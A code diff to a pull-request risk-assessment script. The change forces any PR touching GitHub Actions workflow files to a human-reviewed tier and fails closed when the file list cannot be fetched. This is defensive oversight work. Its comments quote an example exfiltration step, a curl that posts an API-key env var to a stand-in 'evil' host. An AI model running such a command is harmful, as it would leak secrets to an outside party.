@@ -638,41 +638,58 @@ def _is_workflow_path(filename):
     return name.startswith(".github/workflows/") and name.endswith((".yml", ".yaml"))
 
 
-def _secret_referencing_workflow_files(files):
+def _changed_workflow_files(files):
     """The deterministic security floor's evidence: the subset of changed files that are
-    ``.github/workflows/*.yml|.yaml`` AND whose diff touches a ``secrets.`` reference.
+    ``.github/workflows/*.yml|.yaml`` — ANY of them, regardless of whether the visible diff
+    hunk contains a literal ``secrets.`` token.
 
     ``files`` is the GitHub ``GET /pulls/N/files`` payload (list of {filename, patch, ...}).
-    A change to a secret-referencing CI workflow is a privileged-surface change: it runs on
-    ``push: master`` with the secret + GITHUB_TOKEN in scope, outside the app's own auth, so
-    a malicious/buggy step could exfiltrate the secret on the next master push (#1185). We
-    grep the PATCH (added/removed/context lines of the diff) for ``secrets.`` so that even a
-    workflow that didn't *previously* reference a secret but is being EDITED in a hunk that
-    does is caught; a missing/None patch (e.g. a rename with no textual diff) is treated as
-    secret-referencing for that workflow path — fail safe, the false-positive cost is one
-    human gate-clear. Pure: deterministic over its input, no I/O, no LLM."""
+    A change to a CI workflow is a privileged-surface change: it runs on ``push: master``
+    with the provisioned secret + GITHUB_TOKEN in scope, OUTSIDE the app's own auth, so a
+    malicious/buggy step could exfiltrate the secret on the next master push (#1185). We do
+    NOT require the hunk to mention ``secrets.``: a step can exfiltrate the keystone secret
+    via the env var the workflow already injects (``run: curl evil.example -d
+    "$AIOS_API_KEY"``) with no literal ``secrets.`` in the added hunk, so a ``secrets.``-in-
+    patch heuristic is trivially bypassed (#1187). #1185 explicitly endorsed the broader
+    rule: ANY diff touching ``.github/workflows/`` floors to tier-3; the false-positive cost
+    is one human gate-clear. Pure: deterministic over its input, no I/O, no LLM."""
     hits = []
     if not isinstance(files, list):
         return hits
     for f in files:
         if not isinstance(f, dict):
             continue
-        if not _is_workflow_path(f.get("filename")):
-            continue
-        patch = f.get("patch")
-        if not isinstance(patch, str) or "secrets." in patch:
-            # No textual patch (rename/binary/too-large) -> can't prove it's safe: floor it.
+        if _is_workflow_path(f.get("filename")):
             hits.append(f.get("filename"))
     return hits
 
 
+# Sentinel filename used in the fail-closed floor when the files payload could not be
+# fetched/parsed: we cannot prove the PR is safe, so we floor it and record WHY.
+_FILES_UNAVAILABLE = "<files unavailable: fail-closed>"
+
+
 def _risk_floor(tier, files):
-    """Post-process the risk agent's ``tier`` with the deterministic secret-workflow floor:
-    if the PR's changed-files set includes a secret-referencing ``.github/workflows`` file,
-    return ``max(tier, 3)`` so the PR parks at the human merge_approval gate and never
-    auto-merges (#1185). A security control must not depend on an LLM noticing — this floor
-    is mechanical. Returns ``(floored_tier, floored_files)``."""
-    floored_files = _secret_referencing_workflow_files(files)
+    """Post-process the risk agent's ``tier`` with the deterministic CI-workflow floor.
+
+    Two ways the floor fires, both returning ``max(tier, 3)`` so the PR parks at the human
+    merge_approval gate (3 > AUTO_MERGE_MAX_TIER) and never auto-merges:
+
+    1. ``files`` is a valid list AND it includes a changed ``.github/workflows`` file —
+       a privileged-surface change that could exfiltrate the provisioned secret on the next
+       master push (#1185).
+    2. **FAIL CLOSED:** ``files`` is NOT a list (the ``GET /pulls/N/files`` fetch failed or
+       returned a non-list). We cannot prove the PR doesn't touch a workflow, so we floor to
+       tier-3 and require human review rather than letting a flaky files call silently weaken
+       the control (#1187). A security control must err toward the conservative side on
+       missing evidence, never assume safe.
+
+    A security control must not depend on an LLM noticing — this floor is mechanical.
+    Returns ``(floored_tier, floored_files)``."""
+    if not isinstance(files, list):
+        # Couldn't fetch/parse the changed-files set -> can't prove safe -> floor (fail closed).
+        return max(int(tier), 3), [_FILES_UNAVAILABLE]
+    floored_files = _changed_workflow_files(files)
     if floored_files:
         return max(int(tier), 3), floored_files
     return int(tier), floored_files
@@ -957,24 +974,27 @@ async def main(input):
         summary = str(risk["summary"])
     except (AgentError, KeyError, ValueError, TypeError) as exc:
         log("risk assessment failed (non-blocking):", exc)
-    # Deterministic security floor (#1185): a PR touching a secret-referencing
+    # Deterministic security floor (#1185, broadened + fail-closed #1187): a PR touching ANY
     # .github/workflows file is a privileged-surface change that could exfiltrate the
-    # provisioned secret on the next master push, so it must NEVER auto-merge. Post-process
-    # the agent's tier mechanically (tier = max(tier, 3)) rather than trusting the LLM to
-    # notice — the risk node already has the PR, so fetch its changed files and grep the
-    # diff for `secrets.`. The fetch is best-effort: a fetch failure can only RAISE the tier
-    # toward the conservative side, never lower it, so a flaky files call cannot weaken the
-    # control (and never blocks the run).
-    floored_files = []
+    # provisioned secret on the next master push (e.g. `run: curl evil -d "$AIOS_API_KEY"` —
+    # no literal `secrets.` needed), so it must NEVER auto-merge. Post-process the agent's
+    # tier mechanically (tier = max(tier, 3)) rather than trusting the LLM to notice — the
+    # risk node already has the PR, so fetch its changed files. FAIL CLOSED: if the files
+    # fetch raises or returns a non-list we CANNOT prove the PR is workflow-free, so we floor
+    # to tier-3 (require a human gate) instead of letting a flaky files call silently leave a
+    # possibly-auto-merging tier standing. The floor can only RAISE the tier, never lower it,
+    # and never blocks the run.
     try:
         files = _json_body(await gh("GET", _ipath(repo, "/pulls/%d/files" % pr_number)))
-        tier, floored_files = _risk_floor(tier, files)
-    except (KeyError, ValueError, TypeError) as exc:
-        log("risk floor check failed (non-blocking):", exc)
+    except Exception as exc:  # noqa: BLE001 — fetch failure must fail CLOSED, not open
+        log("risk floor files-fetch failed (failing closed to tier-3):", exc)
+        files = None
+    tier, floored_files = _risk_floor(tier, files)
     if floored_files:
-        summary = ("%s\n\n_Risk floored to tier %d: this PR changes secret-referencing "
-                   "CI workflow(s) (%s) — a privileged surface that must clear a human gate "
-                   "before merge (#1185)._" % (summary, tier, ", ".join(floored_files)))
+        summary = ("%s\n\n_Risk floored to tier %d: this PR changes CI workflow file(s) "
+                   "(%s) — a privileged surface that must clear a human gate before merge "
+                   "(#1185/#1187). A files-fetch failure also floors here (fail closed)._"
+                   % (summary, tier, ", ".join(floored_files)))
     await gh("POST", _ipath(repo, "/issues/%d/labels" % pr_number),
              {"labels": ["risk:tier-%d" % tier]})
     await gh("POST", _ipath(repo, "/issues/%d/comments" % pr_number),
